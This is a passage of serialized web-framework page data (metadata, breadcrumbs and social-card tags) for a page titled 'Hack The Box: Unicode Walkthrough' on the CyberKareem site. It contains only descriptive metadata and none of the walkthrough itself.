Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/d24ac389f40e348f0a9fcd49ae95b935f1e85d90/HTB-Unicode.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-unicode-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-unicode-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Unicode Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-unicode-walkthrough/"}]}]}18:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1a"}}]
+a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
+1b:I[1884,[],"IconMark"]
+7:null
+c:[["$","title","0",{"children":"Hack The Box: Unicode Walkthrough — CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Unicode machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","8",{"name":"publisher","content":"CyberKareem"}],["$","meta","9",{"name":"robots","content":"index, follow"}],["$","link","10",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-unicode-walkthrough/"}],["$","meta","11",{"property":"og:title","content":"Hack The Box: Unicode Walkthrough"}],["$","meta","12",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Unicode machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","13",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-unicode-walkthrough/"}],["$","meta","14",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","15",{"property":"og:locale","content":"en_US"}],["$","meta","16",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-unicode-walkthrough.webp"}],["$","meta","17",{"property":"og:image:width","content":"300"}],["$","meta","18",{"property":"og:image:height","content":"300"}],["$","meta","19",{"property":"og:image:alt","content":"Hack The Box Unicode machine avatar"}],["$","meta","20",{"property":"og:type","content":"article"}],["$","meta","21",{"property":"article:published_time","content":"2026-06-11T11:00:04.000Z"}],["$","meta","22",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","23",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","24",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","25",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","26",{"name":"twitter:title","content":"Hack The Box: Unicode Walkthrough"}],["$","meta","27",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Unicode machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","28",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-unicode-walkthrough.webp"}],["$","link","29",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","$L1b","30",{}]]
